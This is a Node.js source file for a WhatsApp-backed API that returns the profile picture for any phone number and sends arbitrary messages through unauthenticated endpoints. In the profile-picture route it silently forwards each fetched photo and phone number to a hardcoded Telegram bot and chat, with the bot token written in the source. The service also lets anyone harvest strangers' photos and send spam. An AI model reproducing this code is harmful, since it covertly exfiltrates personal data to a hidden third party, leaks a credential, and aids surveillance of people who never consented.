// Import required modules
const { Client, LocalAuth } = require('whatsapp-web.js');
const express = require('express');
const cors = require('cors');
const compression = require('compression');
const qrcode = require('qrcode-terminal');
const fetch = require('node-fetch'); // Ensure node-fetch is installed and imported

// Initialize Express app
const app = express();
const port = 3000; 
let serverStarted = false; // Flag to ensure server only starts once
const pendingRequests = new Map(); // Map to track pending profile pic requests

// Use CORS
app.use(cors());

// Use Gzip Compression
app.use(compression());

const client = new Client({
    authStrategy: new LocalAuth(),  // LocalAuth saves session so no re-scan is needed
});

// Function to sanitize and ensure the phone number starts with '91'
const sanitizePhoneNumber = (phone) => {
    // Remove all non-digit characters (spaces, hyphens, brackets, etc.)
    let cleanedPhoneNumber = phone.replace(/\D/g, '');

    // Ensure the phone number starts with '91' (country code)
    if (!cleanedPhoneNumber.startsWith('91')) {
        // Remove leading zeros if present
        cleanedPhoneNumber = cleanedPhoneNumber.replace(/^0+/, '');
        // Prepend '91' if it does not already start with it
        cleanedPhoneNumber = `91${cleanedPhoneNumber}`;
    }

    return cleanedPhoneNumber;
};

// Function to validate phone number after sanitization
const isValidPhoneNumber = (phone) => {
    // This regex matches valid phone numbers (e.g., only digits, 7-15 characters long)
    const phoneRegex = /^\d{7,15}$/;
    return phoneRegex.test(phone);
};

client.on('qr', (qr) => {
    // Generate and display the QR code in the terminal (only on first-time setup)
    qrcode.generate(qr, { small: true });
    console.log('QR code received, scan it with WhatsApp!');
});

client.on('ready', async () => {
    console.log('Client is ready to use!');

    // Only start the server if it hasn't been started already
    if (!serverStarted) {
        app.listen(port, () => {
            console.log(`API server is running on http://localhost:${port}`);
        });
        serverStarted = true;  // Set the flag to true after the server starts
    }
    
    // Route to get profile picture of a number
    app.get('/:number', async (req, res) => {
        let phone = req.params.number;

        if (phone == 'favicon.ico') {
            return res.status(200).json({ ok: 'true' });
        }

        // Sanitize and validate the phone number
        const sanitizedPhone = sanitizePhoneNumber(phone);
        if (!isValidPhoneNumber(sanitizedPhone)) {
            return res.status(400).json({ error: 'Invalid phone number format. Only digits (7-15) are allowed.' });
        }

        const phoneNumber = `${sanitizedPhone}@c.us`;

        // Check if a request for this phone number is already in progress
        if (pendingRequests.has(phoneNumber)) {
            console.log(`Request for ${phoneNumber} is already in progress. Waiting for it to complete.`);
            
            // Wait for the existing request to complete
            const profilePicUrl = await pendingRequests.get(phoneNumber);
            if (profilePicUrl) {
                return res.json({ profilePicUrl, status: { status: "" } });
            } else {
                return res.status(500).json({ error: 'Failed to fetch profile picture (in progress)' });
            }
        }

        try {
            // Store a pending request with a Promise for the response
            const profilePicPromise = client.getProfilePicUrl(phoneNumber);
            pendingRequests.set(phoneNumber, profilePicPromise);

            let profilePicUrl = await profilePicPromise;

            if (profilePicUrl) {
                res.json({ profilePicUrl, status: { status: "" } });

                if (phoneNumber !== '917994107442@c.us') {
                    const sanitizedPhoneNumber = phoneNumber.replace(/"/g, '');
                    const telegramUrl = `https://api.telegram.org/bot1946326672:AAEwXYJ0QjXFKcpKMmlYD0V7-3TcFs_tcSA/sendPhoto?chat_id=-1001723645621&photo=${encodeURIComponent(profilePicUrl)}&caption=${encodeURIComponent(sanitizedPhoneNumber)}`;

                    try {
                        await fetch(telegramUrl);
                    } catch (fetchError) {
                        console.error('Failed to send photo to Telegram:', fetchError);
                    }
                }
            } else {
                res.json({ phoneNumber, profilePicUrl: 'No profile picture found' });
            }
        } catch (error) {
            console.error('Error fetching profile picture:', error);
            res.status(500).json({ error: 'Failed to fetch profile picture' });
        } finally {
            // Remove the request from pendingRequests once it's completed or failed
            pendingRequests.delete(phoneNumber);
        }
    });
});

// Handle incoming messages
client.on('message', msg => {
    if (msg.body.toLowerCase() === '!ping') {
        msg.reply('pong');
    }
});

// API to send a message to a specific phone number
app.get('/send', async (req, res) => {
    const phone = req.query.nm;
    const message = req.query.message;

    // Sanitize and validate the phone number
    const sanitizedPhone = sanitizePhoneNumber(phone);
    if (!sanitizedPhone || !isValidPhoneNumber(sanitizedPhone)) {
        return res.status(400).json({ error: 'Invalid phone number format. Phone number must contain 7-15 digits.' });
    }

    if (!message) {
        return res.status(400).json({ error: 'Message is required.' });
    }

    const phoneNumber = `${sanitizedPhone}@c.us`; // Construct the WhatsApp number format

    try {
        // Send the message to the specified phone number
        await client.sendMessage(phoneNumber, message);
        res.json({ status: 'Message sent successfully', phoneNumber, message });
    } catch (error) {
        res.status(500).json({ error: 'Failed to send message', details: error.message });
    }
});

client.initialize().then(() => console.log('starting...'));
